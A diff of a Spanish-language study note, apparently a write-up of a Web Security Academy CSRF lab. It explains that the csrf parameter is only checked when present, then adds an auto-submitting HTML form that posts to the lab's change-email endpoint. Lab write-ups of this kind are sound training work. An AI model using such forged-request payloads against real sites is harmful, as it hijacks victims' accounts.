@@ -12,4 +12,9 @@ si eliminamos los parámetros `email` y `csrf` la respuesta nos indica que falta
 ok. parece que el parámetro `csrf` solo tiene una validación si este se encuentra presente. por lo que podemos simplemente eliminar este parámetro y crear nuestra etiqueta `csrf` para poder realizar el ataque
 ![[Pasted image 20250703175706.png]]
 
-### O
+### OPCIÓN 2 
+
+```python
+`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
+<input type="hidden" name="$param1name" value="$param1value"> </form> <script> document.forms[0].submit(); </script>`
+```
